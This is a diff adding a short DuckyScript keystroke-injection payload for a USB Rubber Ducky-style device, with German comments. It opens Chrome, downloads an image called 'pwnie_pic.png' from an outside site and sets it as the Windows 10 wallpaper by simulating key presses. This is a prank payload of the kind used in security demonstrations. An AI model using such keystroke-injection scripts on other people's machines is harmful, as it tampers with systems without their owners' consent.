@@ -1,0 +1,59 @@
+REM Skript zum Ändern des Hintergrunds bei Win10
+REM Standard-App muss zum öffnen der Fotos verwendet werden
+REM IMPORTANT Wenn Google Chrome genutzt wird: Google Chrome merkt REM sich wo zuletzt gespeichert wurde!Verzeichnis evtl anpassen.
+DELAY 5000
+CONTROL ESCAPE
+DELAY 100
+REM Note: Chrome klappt gut, firefox oder ie wahlweise (Verzeichnis unten anpassen)
+STRING chrome https://montimon.mirfac.uberspace.de/wordpress/wp-content/uploads/2018/01/pwnie_pic.png
+ENTER
+DELAY 4000
+CONTROL s
+DELAY 2000
+ENTER
+DELAY 300
+CONTROL ESCAPE
+DELAY 300
+REM Bei Interne Explorer, ändere 'Downloads' to 'Documents'
+REM Bei Firefox Firefox, change 'Downloads' to 'Pictures'
+STRING %USERPROFILE%\Downloads\pwnie_pic.png
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+DOWN
+DELAY 500
+ENTER
+DELAY 500
+DOWN
+DELAY 500
+ENTER
